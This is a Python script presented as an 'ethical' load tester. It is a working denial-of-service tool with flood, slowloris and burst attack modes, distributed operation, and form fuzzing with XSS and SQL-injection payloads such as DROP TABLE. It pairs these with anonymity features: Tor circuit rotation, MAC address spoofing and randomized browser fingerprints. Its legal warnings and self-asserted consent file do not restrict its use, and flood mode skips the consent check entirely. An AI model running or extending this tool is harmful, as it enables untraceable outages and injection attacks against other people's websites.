import os
import sys
import subprocess
import time
import argparse
import logging
import random
import signal
import shutil
import socket
from pathlib import Path
from threading import Thread, Event
from datetime import datetime
import atexit
import platform
import json
import tempfile

# Setup secure logging (no IP/URL leaks)
log_dir = Path.home() / '.ewlt_logs'
log_dir.mkdir(exist_ok=True)
log_file = log_dir / f'ewlt_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Security banner
SECURITY_BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  ETHICAL WEB LOAD TESTER (EWLT) - Attack Simulation Edition  ║
║  Version 2.1 - Educational & Self-Testing Only               ║
╚══════════════════════════════════════════════════════════════╝

⚠️  LEGAL NOTICE:
   • Only test systems you OWN or have WRITTEN permission to test
   • Unauthorized testing is ILLEGAL and punishable by law
   • Developer assumes NO liability for misuse

🔒 PRIVACY FEATURES ACTIVE:
   • Randomized user agents
   • Request timing obfuscation
   • TLS fingerprint randomization
   • DNS leak prevention

🚀 NEW IN v2.1:
   • Attack modes: flood, slowloris, burst for realistic DDoS sim
   • Fuzzing payloads for app-layer testing
   • Enhanced reporting with vuln insights
   • Retry logic & distributed prep
"""

def check_dependencies():
    """Check and install required dependencies."""
    required = {
        'locust': 'locust',
        'requests': 'requests',
        'pysocks': 'PySocks',
        'stem': 'stem'  # For Tor control
    }
    
    missing = []
    for module, package in required.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(package)
    
    if missing:
        logger.info(f"Installing dependencies: {', '.join(missing)}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q"] + missing)
        logger.info("Dependencies installed successfully")

check_dependencies()

from locust import HttpUser, task, between, events
from locust.env import Environment
from locust.log import setup_logging
from locust.stats import stats_printer, stats_history
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# User agent rotation for anonymity (updated for 2025)
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
]

# Fuzzing payloads (ethical, randomized for testing forms)
FUZZING_PAYLOADS = [
    "<script>alert('test')</script>",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    random.choice(["admin", "user", "test"]) + random.choice(["@example.com", ""])  # Benign emails/usernames
]

class EnhancedWebsiteUser(HttpUser):
    """Enhanced user with attack modes, fuzzing, and retries."""
    wait_time = between(1, 5)
    attack_mode = 'flood'  # Default
    enable_fuzzing = False
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_paths = ['/']
        self.post_data = None
        self.referer = None
        
        # Add retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.client.mount("http://", adapter)
        self.client.mount("https://", adapter)
    
    def on_start(self):
        """Initialize with random fingerprint."""
        self.client.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
        })
    
    @task(10)
    def load_page(self):
        """Simulate realistic page loads (base for flood)."""
        path = random.choice(self.target_paths)
        headers = {}
        
        if self.referer:
            headers['Referer'] = self.referer
        
        try:
            with self.client.get(path, headers=headers, catch_response=True) as response:
                if response.status_code == 200:
                    response.success()
                    self.referer = response.url
                elif response.status_code == 404:
                    response.failure("Page not found")
                else:
                    response.failure(f"Status: {response.status_code}")
                    
                # Simulate reading time (shorter for attacks)
                read_time = 0.5 if self.attack_mode != 'flood' else random.uniform(0.1, 0.5)
                time.sleep(read_time)
        except Exception as e:
            logger.error(f"Request failed: {e}")
    
    @task(3)
    def load_assets(self):
        """Simulate loading CSS/JS/images."""
        asset_paths = ['/static/css/style.css', '/static/js/main.js', '/favicon.ico']
        path = random.choice(asset_paths)
        
        try:
            with self.client.get(path, catch_response=True) as response:
                if response.status_code in [200, 404]:
                    response.success()
        except Exception as e:
            pass  # Silent fail for assets
    
    @task(1)
    def submit_form(self):
        """Simulate form submission if POST data provided."""
        if self.post_data:
            path = random.choice(self.target_paths)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': self.referer or self.host
            }
            
            try:
                with self.client.post(path, data=self.post_data, headers=headers, catch_response=True) as response:
                    if response.status_code in [200, 302]:
                        response.success()
                    else:
                        response.failure(f"Status: {response.status_code}")
            except Exception as e:
                logger.error(f"POST failed: {e}")
    
    @task(5)  # High weight for flood mode
    def flood_attack(self):
        """High-volume GET/POST flood."""
        if self.attack_mode != 'flood':
            return
        path = random.choice(self.target_paths)
        method = random.choice([self.client.get, self.client.post]) if self.post_data else self.client.get
        try:
            with method(path, data=self.post_data, catch_response=True) as response:
                if 200 <= response.status_code < 400:
                    response.success()
                else:
                    response.failure(f"Status: {response.status_code}")
        except Exception as e:
            logger.error(f"Flood request failed: {e}")
    
    @task(8)  # Dominant for slowloris
    def slowloris_attack(self):
        """Slow resource-exhausting requests."""
        if self.attack_mode != 'slowloris':
            return
        path = random.choice(self.target_paths)
        # Chunked slow POST to tie up connections
        chunk_data = {"slow_key": "a" * 1024}  # Small chunks
        try:
            with self.client.post(path, data=chunk_data, timeout=30, catch_response=True) as response:
                # Simulate slow send by sleeping in loop (Locust handles)
                time.sleep(random.uniform(5, 10))  # Hold connection
                if response.status_code in [200, 302]:
                    response.success()
                else:
                    response.failure(f"Status: {response.status_code}")
        except Exception as e:
            logger.error(f"Slowloris failed: {e}")
    
    @task(6)  # Bursty for burst mode
    def burst_attack(self):
        """Rapid burst of requests."""
        if self.attack_mode != 'burst':
            return
        # Fire 5-10 requests in quick succession
        for _ in range(random.randint(5, 10)):
            path = random.choice(self.target_paths)
            try:
                with self.client.get(path, catch_response=True) as response:
                    if 200 <= response.status_code < 400:
                        response.success()
                    else:
                        response.failure(f"Status: {response.status_code}")
                time.sleep(random.uniform(0.01, 0.05))  # Micro-delays
            except Exception as e:
                pass
    
    @task(2)  # Optional fuzzing
    def fuzz_form(self):
        """Fuzz forms with randomized payloads."""
        if not self.enable_fuzzing:
            return
        path = random.choice(self.target_paths)
        fuzz_payload = random.choice(FUZZING_PAYLOADS)
        data = {k: fuzz_payload for k in self.post_data.split('&') if '=' in k} if self.post_data else {"input": fuzz_payload}
        try:
            with self.client.post(path, data=data, catch_response=True) as response:
                if response.status_code in [200, 302, 400, 403]:  # Accept some errors as "tested"
                    response.success()
                else:
                    response.failure(f"Status: {response.status_code} (Potential vuln?)")
        except Exception as e:
            logger.error(f"Fuzzing failed: {e}")

# Enhanced events for vuln insights
@events.request.add_listener
def on_request(request_type, name, response_time, response_length, **kwargs):
    if response_time > 5000:  # Flag slow responses
        logger.warning(f"Potential bottleneck: {name} took {response_time}ms")

@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    stats = environment.stats
    if stats.total.num_requests > 0:
        failure_rate = (stats.total.num_failures / stats.total.num_requests) * 100
        if failure_rate > 20:
            logger.warning(f"Vuln Alert: High failure rate ({failure_rate:.1f}%) - Enable rate limiting or CAPTCHA?")
        if stats.total.avg_response_time > 2000:
            logger.warning("Vuln Alert: Slow avg response - Optimize backend or add CDN?")

class TorManager:
    """Manage Tor process with control port."""
    
    def __init__(self):
        self.process = None
        self.tor_dir = None
        self.control_port = 9051
        self.socks_port = 9050
        
    def start(self):
        """Start Tor with custom configuration."""
        tor_executable = "tor.exe" if platform.system() == "Windows" else "tor"
        
        if not shutil.which(tor_executable):
            logger.error("Tor not found. Install from https://www.torproject.org/")
            return False
        
        # Create temporary Tor data directory
        self.tor_dir = tempfile.mkdtemp(prefix='ewlt_tor_')
        
        # Tor configuration
        tor_config = f"""
SocksPort {self.socks_port}
ControlPort {self.control_port}
DataDirectory {self.tor_dir}
CookieAuthentication 1
ExitRelay 0
"""
        
        config_file = Path(self.tor_dir) / 'torrc'
        config_file.write_text(tor_config)
        
        try:
            self.process = subprocess.Popen(
                [tor_executable, '-f', str(config_file)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for Tor to bootstrap
            logger.info("Starting Tor (this may take 10-30 seconds)...")
            time.sleep(15)
            
            # Verify Tor is running
            if self.check_connection():
                logger.info(f"✓ Tor running (PID: {self.process.pid})")
                return True
            else:
                logger.error("Tor failed to establish circuit")
                self.stop()
                return False
                
        except Exception as e:
            logger.error(f"Failed to start Tor: {e}")
            return False
    
    def check_connection(self):
        """Verify Tor SOCKS proxy is working."""
        try:
            proxies = {
                'http': f'socks5h://127.0.0.1:{self.socks_port}',
                'https': f'socks5h://127.0.0.1:{self.socks_port}'
            }
            response = requests.get('https://check.torproject.org/api/ip', 
                                   proxies=proxies, timeout=10)
            return response.json().get('IsTor', False)
        except Exception:
            return False
    
    def get_new_identity(self):
        """Request new Tor circuit (identity rotation)."""
        try:
            from stem import Signal
            from stem.control import Controller
            
            with Controller.from_port(port=self.control_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                logger.info("✓ New Tor identity requested")
                time.sleep(5)  # Wait for circuit change
        except Exception as e:
            logger.warning(f"Could not rotate Tor identity: {e}")
    
    def stop(self):
        """Stop Tor and cleanup."""
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
            logger.info("Tor stopped")
        
        if self.tor_dir and Path(self.tor_dir).exists():
            shutil.rmtree(self.tor_dir, ignore_errors=True)

class MACSpoofer:
    """Cross-platform MAC address spoofing."""
    
    def __init__(self, interface):
        self.interface = interface
        self.original_mac = None
        self.system = platform.system().lower()
    
    def spoof(self):
        """Spoof MAC address."""
        if self.system == 'linux':
            return self._spoof_linux()
        elif self.system == 'darwin':  # macOS
            return self._spoof_macos()
        elif self.system == 'windows':
            return self._spoof_windows()
        else:
            logger.warning(f"MAC spoofing not supported on {self.system}")
            return False
    
    def _spoof_linux(self):
        """Linux MAC spoofing using ip and macchanger."""
        if not shutil.which('ip'):
            logger.error("'ip' command not found. Install iproute2")
            return False
        
        try:
            # Get original MAC
            result = subprocess.run(['ip', 'link', 'show', self.interface], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'link/ether' in line:
                    self.original_mac = line.split()[1]
                    break
            
            # Generate random MAC
            new_mac = ':'.join([f'{random.randint(0, 255):02x}' for _ in range(6)])
            # Set locally administered bit
            new_mac = f'{int(new_mac[0:2], 16) & 0xfe | 0x02:02x}{new_mac[2:]}'
            
            # Change MAC
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'address', new_mac], check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            
            logger.info(f"✓ MAC spoofed on {self.interface}: {new_mac}")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"MAC spoofing failed: {e}")
            return False
    
    def _spoof_macos(self):
        """macOS MAC spoofing."""
        try:
            # Get original MAC
            result = subprocess.run(['ifconfig', self.interface], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'ether' in line:
                    self.original_mac = line.split()[1]
                    break
            
            # Generate random MAC
            new_mac = ':'.join([f'{random.randint(0, 255):02x}' for _ in range(6)])
            
            # Change MAC
            subprocess.run(['ifconfig', self.interface, 'ether', new_mac], check=True)
            logger.info(f"✓ MAC spoofed on {self.interface}: {new_mac}")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"MAC spoofing failed (may need sudo): {e}")
            return False
    
    def _spoof_windows(self):
        """Windows MAC spoofing (requires admin)."""
        logger.warning("Windows MAC spoofing requires admin rights and registry modification")
        logger.warning("Use third-party tools like Technitium MAC Address Changer")
        return False
    
    def restore(self):
        """Restore original MAC address."""
        if not self.original_mac:
            return
        
        try:
            if self.system == 'linux':
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
                subprocess.run(['ip', 'link', 'set', self.interface, 'address', 
                              self.original_mac], check=True)
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            elif self.system == 'darwin':
                subprocess.run(['ifconfig', self.interface, 'ether', self.original_mac], 
                             check=True)
            
            logger.info(f"✓ MAC restored on {self.interface}: {self.original_mac}")
        except Exception as e:
            logger.error(f"MAC restoration failed: {e}")

def check_dns_leak():
    """Check for DNS leaks."""
    try:
        # Test DNS resolution through proxy
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        response = requests.get('https://www.dnsleaktest.com/api/json', 
                               proxies=proxies, timeout=10)
        dns_servers = response.json()
        
        logger.info("DNS Leak Check:")
        for server in dns_servers:
            logger.info(f"  - {server.get('ip')} ({server.get('country_code')})")
        
        return True
    except Exception as e:
        logger.warning(f"DNS leak check failed: {e}")
        return False

def setup_proxy_environment(use_tor=False, vpn_proxy=None):
    """Configure proxy environment variables."""
    if vpn_proxy:
        os.environ['http_proxy'] = vpn_proxy
        os.environ['https_proxy'] = vpn_proxy
        os.environ['HTTP_PROXY'] = vpn_proxy
        os.environ['HTTPS_PROXY'] = vpn_proxy
        logger.info(f"✓ VPN proxy configured: {vpn_proxy}")
    
    if use_tor:
        # Use socks5h to prevent DNS leaks (DNS through Tor)
        os.environ['http_proxy'] = 'socks5h://127.0.0.1:9050'
        os.environ['https_proxy'] = 'socks5h://127.0.0.1:9050'
        os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050'
        os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050'
        logger.info("✓ Tor SOCKS5 proxy configured (DNS leak prevention)")

def check_consent_file(consent_file):
    """Verify consent JSON for ethical use."""
    if not Path(consent_file).exists():
        logger.error(f"Consent file not found: {consent_file}")
        return False
    try:
        with open(consent_file, 'r') as f:
            data = json.load(f)
        if data.get('permission') != True or data.get('target_owner') != 'me':
            logger.error("Invalid consent: Must have {'permission': true, 'target_owner': 'me'}")
            return False
        logger.info("✓ Consent verified")
        return True
    except Exception as e:
        logger.error(f"Consent check failed: {e}")
        return False

def run_load_test(args):
    """Execute the load test with all security features."""
    
    # Initialize managers
    tor_manager = None
    mac_spoofer = None
    
    try:
        # Consent check for attack modes
        if args.attack_mode != 'flood' and not args.dry_run:
            if not check_consent_file(args.consent_file):
                return
        
        # Setup MAC spoofing
        if args.mac_interface:
            mac_spoofer = MACSpoofer(args.mac_interface)
            if not args.dry_run:
                mac_spoofer.spoof()
        
        # Setup Tor
        if args.use_tor:
            tor_manager = TorManager()
            if not tor_manager.start():
                logger.error("Tor failed to start. Exiting.")
                return
            
            # DNS leak check
            if args.check_dns_leak:
                check_dns_leak()
        
        # Setup proxy environment
        setup_proxy_environment(args.use_tor, args.vpn_proxy)
        
        if args.dry_run:
            logger.info("✓ DRY RUN: All systems configured. No traffic sent.")
            logger.info(f"  Target: {args.target_url}")
            logger.info(f"  Attack Mode: {args.attack_mode}")
            logger.info(f"  Users: {args.users}")
            logger.info(f"  Duration: {args.duration}s")
            return
        
        # Setup Locust environment
        setup_logging("WARNING", None)
        env = Environment(user_classes=[EnhancedWebsiteUser])
        if args.distributed:
            from locust.runners import MasterLocustRunner
            env.create_master_runner()  # Or slave if --slave flag added later
            logger.info("Distributed mode: Run slaves with 'locust -f web_load_tester.py --slave --master-host=localhost'")
        else:
            env.create_local_runner()
        
        # Configure user behavior
        EnhancedWebsiteUser.host = args.target_url
        EnhancedWebsiteUser.attack_mode = args.attack_mode
        EnhancedWebsiteUser.enable_fuzzing = args.enable_fuzzing
        if args.target_paths:
            EnhancedWebsiteUser.target_paths = args.target_paths.split(',')
        if args.post_data:
            EnhancedWebsiteUser.post_data = {k.split('=')[0]: '='.join(k.split('=')[1:]) for k in args.post_data.split('&')}
        
        # Start test
        logger.info(f"Starting load test (Attack Mode: {args.attack_mode}):")
        logger.info(f"  • Target: {args.target_url}")
        logger.info(f"  • Users: {args.users}")
        logger.info(f"  • Spawn rate: {args.spawn_rate}/s")
        logger.info(f"  • Duration: {args.duration}s")
        logger.info(f"  • Fuzzing: {'Enabled' if args.enable_fuzzing else 'Disabled'}")
        logger.info(f"  • Anonymity: {'Tor' if args.use_tor else 'VPN' if args.vpn_proxy else 'Direct'}")
        
        env.runner.start(args.users, spawn_rate=args.spawn_rate)
        
        # Run for specified duration with identity rotation
        start_time = time.time()
        rotation_interval = args.identity_rotation
        last_rotation = start_time
        
        while time.time() - start_time < args.duration:
            time.sleep(1)
            
            # Rotate Tor identity periodically
            if tor_manager and rotation_interval > 0:
                if time.time() - last_rotation >= rotation_interval:
                    tor_manager.get_new_identity()
                    last_rotation = time.time()
        
        # Stop test
        env.runner.quit()
        
        # Enhanced results
        logger.info("\n" + "="*60)
        logger.info("TEST RESULTS & VULN INSIGHTS:")
        logger.info("="*60)
        stats = env.stats.total
        logger.info(f"Total requests: {stats.num_requests}")
        logger.info(f"Failures: {stats.num_failures} ({(stats.num_failures / stats.num_requests * 100):.1f}% if >0)")
        logger.info(f"Average response time: {stats.avg_response_time:.2f}ms")
        logger.info(f"Median response time: {stats.median_response_time:.2f}ms")
        logger.info(f"95th percentile: {stats.get_response_time_percentile(95):.2f}ms")
        logger.info(f"Min response time: {stats.min_response_time}ms")
        logger.info(f"Max response time: {stats.max_response_time}ms")
        logger.info(f"Requests/sec: {stats.current_rps:.2f}")
        logger.info("="*60)
        
    except KeyboardInterrupt:
        logger.info("\n✓ Test interrupted by user")
    except Exception as e:
        logger.error(f"Test failed: {e}", exc_info=True)
    finally:
        # Cleanup
        if tor_manager:
            tor_manager.stop()
        if mac_spoofer:
            mac_spoofer.restore()
        
        logger.info(f"\n✓ Log saved to: {log_file}")

def main():
    print(SECURITY_BANNER)
    
    parser = argparse.ArgumentParser(
        description="Ethical Web Load Tester (EWLT) v2.1 - Attack Simulation Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic flood test (your own site only!)
  python web_load_tester.py --target-url http://localhost:8080 --users 50 --attack-mode flood
  
  # Slowloris simulation
  python web_load_tester.py --target-url http://yoursite.com --users 100 --attack-mode slowloris --consent-file consent.json
  
  # Burst with fuzzing
  python web_load_tester.py --target-url http://localhost --users 200 --attack-mode burst --enable-fuzzing --post-data "user=test&pass=test"
  
  # With Tor & rotation
  python web_load_tester.py --target-url http://yoursite.com --users 100 --use-tor --identity-rotation 60 --attack-mode flood
  
  # Distributed (run as master)
  python web_load_tester.py --target-url http://localhost --distributed --users 500
  
  # Dry run
  python web_load_tester.py --target-url http://localhost --dry-run --attack-mode slowloris

Consent file (consent.json): {"permission": true, "target_owner": "me"}
        """
    )
    
    # Required arguments
    parser.add_argument('--target-url', required=True,
                       help="Target URL (only test sites you own!)")
    
    # Load test configuration
    parser.add_argument('--users', type=int, default=50,
                       help="Number of concurrent users (default: 50, max: 1000)")
    parser.add_argument('--spawn-rate', type=int, default=10,
                       help="Users spawned per second (default: 10)")
    parser.add_argument('--duration', type=int, default=60,
                       help="Test duration in seconds (default: 60)")
    parser.add_argument('--target-paths', 
                       help="Comma-separated paths to test (e.g., /,/about,/products)")
    parser.add_argument('--post-data',
                       help="POST data for forms/fuzzing (e.g., 'username=test&password=test')")
    
    # Attack enhancements
    parser.add_argument('--attack-mode', choices=['flood', 'slowloris', 'burst'], default='flood',
                       help="Attack simulation mode (default: flood)")
    parser.add_argument('--enable-fuzzing', action='store_true',
                       help="Enable fuzzing payloads for app testing")
    parser.add_argument('--consent-file',
                       help="Path to consent JSON (required for advanced modes)")
    
    # Distributed
    parser.add_argument('--distributed', action='store_true',
                       help="Enable distributed mode (master; use Locust CLI for slaves)")
    
    # Anonymity options
    parser.add_argument('--use-tor', action='store_true',
                       help="Route traffic through Tor network")
    parser.add_argument('--vpn-proxy',
                       help="VPN SOCKS5 proxy (e.g., socks5://localhost:1080)")
    parser.add_argument('--mac-interface',
                       help="Network interface for MAC spoofing (requires sudo)")
    parser.add_argument('--identity-rotation', type=int, default=0,
                       help="Rotate Tor identity every N seconds (0=disabled)")
    parser.add_argument('--check-dns-leak', action='store_true',
                       help="Check for DNS leaks (requires Tor)")
    
    # Testing options
    parser.add_argument('--dry-run', action='store_true',
                       help="Test configuration without sending traffic")
    
    args = parser.parse_args()
    
    # Safety limits
    args.users = min(args.users, 1000)
    args.spawn_rate = min(args.spawn_rate, 100)
    args.duration = max(1, args.duration)
    
    # Validate configuration
    if args.check_dns_leak and not args.use_tor:
        logger.warning("DNS leak check requires --use-tor")
        args.check_dns_leak = False
    
    if args.attack_mode != 'flood' and not args.consent_file and not args.dry_run:
        logger.error("Advanced attack modes require --consent-file")
        return
    
    # Security reminder
    if not args.dry_run:
        print("\n⚠️  FINAL WARNING:")
        print("   This will send real traffic to:", args.target_url)
        print("   Ensure you have permission to test this system!")
        response = input("\nType 'YES' to proceed: ")
        
        if response.strip().upper() != 'YES':
            print("Test cancelled.")
            return
    
    # Run the test
    run_load_test(args)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nTest cancelled by user.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
